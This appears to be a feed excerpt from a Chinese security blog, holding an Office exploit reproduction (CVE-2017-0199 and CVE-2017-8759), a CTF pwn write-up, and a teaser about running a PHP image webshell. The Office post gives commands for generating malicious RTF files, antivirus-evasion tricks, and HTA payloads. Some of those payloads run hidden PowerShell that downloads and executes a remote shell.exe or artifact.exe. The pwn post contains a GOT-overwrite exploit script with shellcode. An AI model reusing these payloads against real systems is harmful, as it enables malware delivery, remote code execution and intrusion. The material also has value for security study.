      &lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是&lt;code&gt;1.6.2&lt;/code&gt;，php版本是&lt;code&gt;5.3.3&lt;/code&gt;，开了&lt;code&gt;GPC&lt;/code&gt;，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个&lt;code&gt;/.php&lt;/code&gt;访问，它。。竟然执行了！？&lt;br&gt;&lt;img src=&quot;/2018/02/20/2018-2-21/5.png&quot; alt=&quot;5.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>对cve-2017-0199与cve-2017-8759的浅析</title>
    <link href="https://winter3un.github.io/2017/10/29/cve-2017-office/"/>
    <id>https://winter3un.github.io/2017/10/29/cve-2017-office/</id>
    <published>2017-10-29T12:41:52.000Z</published>
    <updated>2018-03-14T04:32:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。</p><p>没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。</p><a id="more"></a><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="victimer"><a href="#victimer" class="headerlink" title="victimer"></a>victimer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">os:10.0.14393 default Build 14393</div><div class="line">office:ver2010(14.0.4760.1000)</div><div class="line">.net:v4.0.30319</div></pre></td></tr></table></figure><p>ps:查看.net版本（资源管理器打开<code>%systemroot%\Microsoft.NET\Framework</code>,最高版本即是）</p><h3 id="attacker"><a href="#attacker" class="headerlink" title="attacker"></a>attacker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python:2.7.14</div></pre></td></tr></table></figure><h2 id="cve-2017-0199"><a href="#cve-2017-0199" class="headerlink" title="cve-2017-0199"></a>cve-2017-0199</h2><p>该漏洞影响版本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Microsoft Office 2016</div><div class="line">Microsoft Office 2013</div><div class="line">Microsoft Office 2010</div><div class="line">Microsoft Office 2007</div></pre></td></tr></table></figure><p>这个漏洞出在word对已经插入的远程对象访问的时候，如果访问的时候http相应头重含有<code>Content-Type: application/hta</code>那么将会对该对象以脚本的方式解析执行。具体的过程如图所示<br><img src="/2017/10/29/cve-2017-office/1.png" alt="1.png" title=""></p><p>脚本：<a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="external">https://github.com/bhdresh/CVE-2017-0199</a></p><p>在实验过程中，发现该脚本有几处坑，一个是<code>server_thread</code>函数写了两遍,还有一个是<code>open</code>函数缺少了一个参数，故而本人修改了这两处问题，修改后的代码放于github上。</p><p>使用方式和原来的脚本没有大的区别 <a href="https://github.com/Winter3un/cve_2017_0199" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_0199</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 1 分发exe可执行文件并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver local payload</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -e http://192.168.1.125/shell.exe -l shell.exe</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 2 分发hta脚本并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver custom HTA file</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -H custom.hta</div></pre></td></tr></table></figure><p>ps：虚拟机win7+office2010 未成功，不知道为啥。。</p><h2 id="cve-2017-8759"><a href="#cve-2017-8759" class="headerlink" title="cve-2017-8759"></a>cve-2017-8759</h2><p>这个漏洞其实是出在.net模块，但是是通过word或者写字板作为媒介引发的。漏洞原因是开发者没有考虑到输入点会存在换行符，导致了单行注释绕过。我们可以将存在换行符的.net代码发送过去绕过单行注释，进行.net代码执行。这个漏洞危害还是挺大的，与office无关，几乎影响所有版本的.net框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Microsoft .NET Framework 4.6.2</div><div class="line">Microsoft .NET Framework 4.6.1</div><div class="line">Microsoft .NET Framework 3.5.1</div><div class="line">Microsoft .NET Framework 4.7</div><div class="line">Microsoft .NET Framework 4.6</div><div class="line">Microsoft .NET Framework 4.5.2</div><div class="line">Microsoft .NET Framework 3.5</div><div class="line">Microsoft .NET Framework 2.0 SP2</div></pre></td></tr></table></figure></p><p>脚本来自: <a href="https://github.com/Winter3un/cve_2017_8759" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_8759</a>  生成exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 CreateRTF.py -f 1.rtf -u http://127.0.0.1:8080/exp.txt</div></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 8080</div></pre></td></tr></table></figure><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>免杀主要参考了<code>剖析RTF文件中的Anti-Analysis技术</code>这篇文章</p><p>1) 不完整的RTF头部</p><p>2）奇怪的16进制数</p><p>3）在16进制数中插入额外的空格</p><p>4）16进制编码数据中的虚假RTF控制字</p><p>5）在16进制数据中包含二进制数据</p><p>但是目前来说，这五种方式做的免杀都会被主流杀软干掉，样本hash：<code>b7f67029abc6e44e860fb13313a2b8024c59f200d3680c5dfd2886c9f3bcfc54</code></p><p>virustotal检出率<code>21/59</code>，目前没有啥好的办法可以绕过杀软。</p><h2 id="hta脚本相关"><a href="#hta脚本相关" class="headerlink" title="hta脚本相关"></a>hta脚本相关</h2><p>最简<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p><p>powershell代码执行</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line"><span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line"><span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line"><span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WbemScripting.SWbemLocator"</span>)</div><div class="line"><span class="keyword">Set</span> Service = Locator.ConnectServer()</div><div class="line">Service.Security_.ImpersonationLevel=impersonation</div><div class="line"><span class="keyword">Set</span> objStartup = Service.<span class="keyword">Get</span>(<span class="string">"Win32_ProcessStartup"</span>)</div><div class="line"><span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</div><div class="line"><span class="keyword">Set</span> Process = Service.<span class="keyword">Get</span>(<span class="string">"Win32_Process"</span>)</div><div class="line"><span class="keyword">Error</span> = Process.Create(<span class="string">"powershell.exe -nop -w hidden calc.exe"</span>, <span class="literal">null</span>, objConfig, intProcessID)</div><div class="line">window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>powershell下载远程exe并执行</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://192.168.1.125/shell.exe\', \'c:/windows/temp/shell.exe\'); c:/windows/temp/shell.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line">    window.resizeTo <span class="number">0</span>,<span class="number">0</span></div><div class="line">    window.MoveTo <span class="number">-100</span>,<span class="number">-100</span></div><div class="line"><span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line"><span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line"><span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</div><div class="line">    Locator.Run<span class="string">"powershell.exe -nop -w hidden -c ""IEX (new-object net.webclient).downloadstring('http://192.168.211.149:80/artifact.exe')"""</span>,<span class="number">0</span>,<span class="literal">FALSE</span></div><div class="line">    window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>以上脚本都能在我的github上找到</p><h2 id="参考文档："><a href="#参考文档：" class="headerlink" title="参考文档："></a>参考文档：</h2><p>对CVE-2017-0199的一次复现过程与内网穿透的利用：<a href="https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo</a><br>OFFICE OLE2LINK（CVE-2017-0199）漏洞利用详解：<a href="http://www.freebuf.com/articles/system/131969.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/131969.html</a><br>CVE-2017-0199漏洞复现：<a href="http://www.hackersb.cn/hacker/228.html" target="_blank" rel="external">http://www.hackersb.cn/hacker/228.html</a><br>一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现：最新的Office高级威胁攻击预警：<a href="http://www.freebuf.com/articles/system/147602.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/147602.html</a><br>CVE-2017-8759 微软word漏洞复现以及利用：<a href="http://www.cnblogs.com/deen-/p/7532078.html" target="_blank" rel="external">http://www.cnblogs.com/deen-/p/7532078.html</a><br>CVE-2017-8759完美复现.并且解决HTA,POWERSHELL弹框闪烁：<a href="http://www.lz1y.cn/?p=799" target="_blank" rel="external">http://www.lz1y.cn/?p=799</a><br>最新CVE-2017-8759漏洞复现的两种姿势：<a href="https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738" target="_blank" rel="external">https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738</a><br>剖析RTF文件中的Anti-Analysis技术：<a href="http://www.freebuf.com/articles/terminal/102018.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/102018.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。&lt;/p&gt;
&lt;p&gt;没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。&lt;/p&gt;
    
    </summary>
    
    
      <category term="cve" scheme="https://winter3un.github.io/tags/cve/"/>
    
      <category term="office" scheme="https://winter3un.github.io/tags/office/"/>
    
  </entry>
  
  <entry>
    <title>810线下赛复盘</title>
    <link href="https://winter3un.github.io/2017/08/16/2017-8-10/"/>
    <id>https://winter3un.github.io/2017/08/16/2017-8-10/</id>
    <published>2017-08-16T16:32:29.000Z</published>
    <updated>2017-08-17T17:05:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>将atoi_got修改成printf_plt，威力无穷~</strong></p><p>线下赛只有一个pwn题，但这一个pwn题却出的非常好，虽然防御机制没有全开，但是考察点非常之多，就其中一个漏洞的利用，就考察了如下五个知识点。</p><ul><li>string overflow</li><li>int overflow</li><li>off by one</li><li>race condition</li><li>heap overlay </li><li>fmt</li></ul><a id="more"></a><h3 id="第一个漏洞"><a href="#第一个漏洞" class="headerlink" title="第一个漏洞"></a>第一个漏洞</h3><p>第一个漏洞出现在west模块，该模块可以创建最多两个house，初始的金币都为5（虽然有一个tricks，但是然并软），然后可以选择其中一个house的id购买weapon，若其中一个house的weapon比另一个强，就可以将另一个house消灭掉（free），那么我们怎么才能增加我们的金币数目呢，其实我们可以利用string overflow的方式，如下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">fgets(&amp;s1, 0x16, stdin);</div><div class="line">v9 = 0xA;</div><div class="line">if ( strlen(&amp;s1) &gt; 0x10 )</div><div class="line">&#123;</div><div class="line">puts(&quot;Your name is too long!&quot;);</div><div class="line">exit(-1);</div><div class="line">&#125;</div><div class="line">str_cpy(0x28LL * (signed int)i + 0x605148, (__int64)&amp;s1);</div></pre></td></tr></table></figure><p>s1可以输入0x16个字节，而string函数都以<code>&#39;\x00&#39;</code>字节定义字符串的结束，我们可以构造绕过，将money覆盖成一个最大数<code>0x7fffffff</code>,即可买我们想要的任何装备，接着漏洞出现在<code>snprintf</code>处，该函数的返回值由原本要复制到<code>dst addr</code> 的数据长度决定，故而这边存在一个溢出，我们只要让返回值大于<code>0x54</code>即可，<code>int overflow</code>刚好能够做到这件事。接着利用刚才获取的长度溢出一个字节（只能达到一个字节，故而我们可以利用<code>off by one</code>技术将指向soliders的指针位置上移），接着利用heap overlay技术将该上移的指针加入到unsorted bin内，在下次分配的时候，能够再次分配到该空间，故而我们可以利用该空间将house中的soliders指针地址修改成<code>atoi_got</code>，然后在写入<code>print_plt</code>的地址，利用fmt技术泄漏libc信息，算出system的地址，将atoi_got的地址修改成system地址，即可拿到shell，草稿如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">0x605140</div><div class="line"></div><div class="line">|ptr1(0xa0)|xxxxxxxx|xxxxxxxx    </div><div class="line"></div><div class="line"></div><div class="line">0x605158</div><div class="line"></div><div class="line">|money 0x605158|length 0x60515c</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">ptr1 size:0xa0</div><div class="line"></div><div class="line">weapon(size:0x68)|ptr2(0x50) size:0x8|ally(size:0x30)</div><div class="line"></div><div class="line">0x10 0x40</div><div class="line"></div><div class="line"></div><div class="line">ptr2( read soliders 0x50)</div><div class="line"></div><div class="line"></div><div class="line">0x605190 ptr2_addr</div><div class="line"></div><div class="line"></div><div class="line">一些细节：</div><div class="line"></div><div class="line">可以从else中的puts字符串来快速分析判断的是什么</div><div class="line"></div><div class="line">uaf漏洞的分析，看free后，指针是否置0</div><div class="line"></div><div class="line">逆向功底很重要。</div><div class="line"></div><div class="line">strcmp</div><div class="line">strlen</div><div class="line">都可以绕过</div></pre></td></tr></table></figure><p>第一个漏洞的利用exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-15 21:50:04</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># west</span></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_house</span><span class="params">(soliders)</span>:</span></div><div class="line"><span class="comment"># create a house</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"\x00"</span>*<span class="number">0x10</span>+p32(<span class="number">0x7fffffff</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"-2147483647"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"><span class="comment">## Words</span></div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x2e</span>)</div><div class="line"></div><div class="line"><span class="comment">## soliders</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(soliders))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*soliders)</div><div class="line"></div><div class="line"><span class="comment">## ally</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x30</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_house2</span><span class="params">()</span>:</span></div><div class="line"><span class="comment"># create a house</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"\x00"</span>*<span class="number">0x10</span>+p32(<span class="number">0x7fffffff</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"><span class="comment"># int overflow</span></div><div class="line">sl(<span class="string">"-2147483647"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"><span class="comment">## Words</span></div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x2e</span>)</div><div class="line"></div><div class="line"><span class="comment">## soliders</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(<span class="number">0x50</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">'a'</span>*<span class="number">0x38</span>+p64(elf.got[<span class="string">"atoi"</span>]))</div><div class="line"></div><div class="line"><span class="comment">## ally</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x30</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_weapon</span><span class="params">(_id,weapon)</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line">ru(<span class="string">'5000000\n'</span>)</div><div class="line">sl(str(weapon))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_word</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"1024"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">" to Death?\n"</span>)</div><div class="line"><span class="comment"># 0x10+0x14</span></div><div class="line">payload = <span class="string">"Not today\x00"</span></div><div class="line">payload = payload.ljust(<span class="number">0x30</span><span class="number">-0x24</span>,<span 